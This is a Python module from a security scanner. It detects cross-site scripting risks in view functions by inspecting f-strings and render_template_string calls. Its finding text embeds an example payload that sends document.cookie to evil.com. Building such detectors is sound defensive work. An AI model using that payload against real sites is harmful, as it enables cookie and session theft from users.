"""XSS detection via AST analysis."""
import ast
import re
from typing import List
from .base import BaseAnalyzer
from ..models.finding import Finding, Severity, VulnerabilityType

HTML_TAG_PATTERN = re.compile(r"<[a-zA-Z][^>]*>")


class XSSAnalyzer(BaseAnalyzer):
    """Detects Cross-Site Scripting risks in view function source code.

    Looks for:
    - f-strings containing HTML tags with user-input variables
    - render_template_string() calls with user-controlled input
    """

    def analyze(self) -> List[Finding]:
        visitor = _XSSVisitor(self)
        visitor.visit(self._tree)
        return self.findings

    def _flag(self, line: int, code: str, variable: str, context: str) -> None:
        self.findings.append(Finding(
            vuln_type=VulnerabilityType.XSS,
            severity=Severity.CRITICAL,
            endpoint=self.endpoint,
            file=self.file_path,
            line=line,
            code_snippet=code,
            explanation=(
                f"Variable '{variable}' appears to contain user input that is "
                f"included in HTML output without escaping ({context}). "
                f"An attacker can inject '<script>document.location="
                f"\"http://evil.com/?c=\"+document.cookie</script>' to steal cookies."
            ),
            fix_recommendation="Escape all user input before including in HTML.",
            fix_before=f'return f"<h1>{{{variable}}}</h1>"',
            fix_after=f'from markupsafe import escape\nreturn f"<h1>{{escape({variable})}}</h1>"',
            reference="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
            source="SAST",
        ))


class _XSSVisitor(ast.NodeVisitor):
    """AST visitor for XSS patterns."""

    def __init__(self, analyzer: XSSAnalyzer):
        self.analyzer = analyzer

    def visit_JoinedStr(self, node: ast.JoinedStr) -> None:
        """Detect f-strings that produce HTML with user variables.

        Example: return f"<h1>{term}</h1>"
        """
        constant_parts = ""
        variables = []

        for value in node.values:
            if isinstance(value, ast.Constant) and isinstance(value.value, str):
                constant_parts += value.value
            elif isinstance(value, ast.FormattedValue):
                var_name = self.analyzer._extract_var_name(value.value)
                if var_name:
                    variables.append(var_name)

        if HTML_TAG_PATTERN.search(constant_parts) and variables:
            for var in variables:
                if self.analyzer._is_user_input_name(var):
                    self.analyzer._flag(
                        line=node.lineno,
                        code=self.analyzer._get_line_text(node.lineno),
                        variable=var,
                        context="f-string with HTML tags",
                    )

        self.generic_visit(node)

    def visit_Call(self, node: ast.Call) -> None:
        """Detect render_template_string() with user input."""
        if self._is_render_template_string(node):
            if node.args:
                arg = node.args[0]
                # render_template_string(user_var)
                if isinstance(arg, ast.Name):
                    var_name = arg.id
                    if self.analyzer._is_user_input_name(var_name):
                        self.analyzer._flag(
                            line=node.lineno,
                            code=self.analyzer._get_line_text(node.lineno),
                            variable=var_name,
                            context="render_template_string with user input variable",
                        )
                # render_template_string(f"...{user_input}...")
                elif isinstance(arg, ast.JoinedStr):
                    for value in arg.values:
                        if isinstance(value, ast.FormattedValue):
                            var_name = self.analyzer._extract_var_name(value.value)
                            if var_name and self.analyzer._is_user_input_name(var_name):
                                self.analyzer._flag(
                                    line=node.lineno,
                                    code=self.analyzer._get_line_text(node.lineno),
                                    variable=var_name,
                                    context="render_template_string with user input in f-string",
                                )

        self.generic_visit(node)

    def _is_render_template_string(self, node: ast.Call) -> bool:
        if isinstance(node.func, ast.Name):
            return node.func.id == "render_template_string"
        if isinstance(node.func, ast.Attribute):
            return node.func.attr == "render_template_string"
        return False
